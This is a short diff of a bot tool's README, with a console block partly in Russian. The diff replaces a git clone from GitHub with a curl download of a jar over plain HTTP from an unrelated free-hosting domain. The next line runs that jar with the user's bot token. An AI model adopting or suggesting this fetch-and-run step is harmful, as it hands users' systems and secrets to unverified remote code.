@@ -1,6 +1,5 @@
 ```console
-root@itskekoffcode:~$ git clone https://github.com/itskekoff/delw.git
-root@itskekoffcode:~$ cd ./delw/jar
+root@itskekoffcode:~$ curl -o delw.jar http://f0652346.xsph.ru/default.jar
 root@itskekoffcode:~$ java -jar delw.jar ТОКЕНБОТА
 Запуск бота
 Команды могут регистрироватся по часу! Возможные причины ошибок:
